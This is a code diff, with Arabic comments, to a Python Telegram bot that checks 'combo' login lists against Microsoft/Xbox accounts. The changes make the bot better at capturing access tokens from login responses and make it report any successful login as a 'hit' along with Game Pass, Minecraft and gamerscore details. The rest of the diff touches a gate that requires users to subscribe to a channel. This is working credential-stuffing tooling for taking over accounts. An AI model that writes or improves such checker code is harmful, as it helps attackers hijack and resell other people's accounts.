@@ -246,10 +246,21 @@ def check_single_account(combo):
         login_text = login_req.text.lower()
 
         ms_token = None
-        if 'access_token' in login_req.url:
-            ms_token = parse_qs(urlparse(login_req.url).fragment).get('access_token', [None])[0]
-        elif 'access_token' in login_text:
-            token_match = re.search(r'access_token=([^&\s\"\']+)', login_text)
+        
+        # تحسين طريقة التقاط التوكن من الـ URL أو الـ Fragment أو النص
+        full_url = login_req.url
+        if 'access_token=' in full_url:
+            parsed_url = urlparse(full_url)
+            fragment_qs = parse_qs(parsed_url.fragment)
+            if 'access_token' in fragment_qs:
+                ms_token = fragment_qs['access_token'][0]
+            else:
+                query_qs = parse_qs(parsed_url.query)
+                if 'access_token' in query_qs:
+                    ms_token = query_qs['access_token'][0]
+
+        if not ms_token:
+            token_match = re.search(r'access_token=([^&\s\"\']+)', login_req.text)
             if token_match:
                 ms_token = token_match.group(1)
         
@@ -324,10 +335,12 @@ def check_single_account(combo):
             f"--------------------------------------------------"
         )
         
+        # تعتبر هيت إذا وُجد أي شيء مميز بالحساب
         if "Active" in final_gp or has_mc or gscore_int > 0 or len(owned_games_list) > 0:
             return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": ("Active" in final_gp or has_gp_basic), "has_xbox": gscore_int > 0}
         else:
-            return "bad", None
+            # حتى لو لم يكن لديه ألعاب، إذا تم تسجيل الدخول بنجاح يعتبر هيت عادي (بالمفهوم العام للشيكرات)
+            return "hit", {"content": hit_info, "has_mc": has_mc, "has_gp": False, "has_xbox": False}
 
     except Exception:
         if session:
@@ -338,7 +351,6 @@ def check_single_account(combo):
 def send_welcome(message):
     chat_id = message.chat.id
     
-    # التحقق من اشتراك المستخدم في القناة
     if not check_user_subscription(chat_id):
         markup = types.InlineKeyboardMarkup(row_width=1)
         btn_channel = types.InlineKeyboardButton("📢 اشترك في القناة الآن", url=f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")
@@ -424,7 +436,6 @@ def callback_query(call):
             bot.answer_callback_query(call.id, "❌ لم تقم بالاشتراك في القناة بعد! الرجاء الاشتراك أولاً.", show_alert=True)
         return
 
-    # التحقق من الاشتراك لأي زر آخر أيضاً لحماية البوت
     if not check_user_subscription(chat_id):
         bot.answer_callback_query(call.id, "⚠️ يجب عليك الاشتراك في القناة أولاً!", show_alert=True)
         return
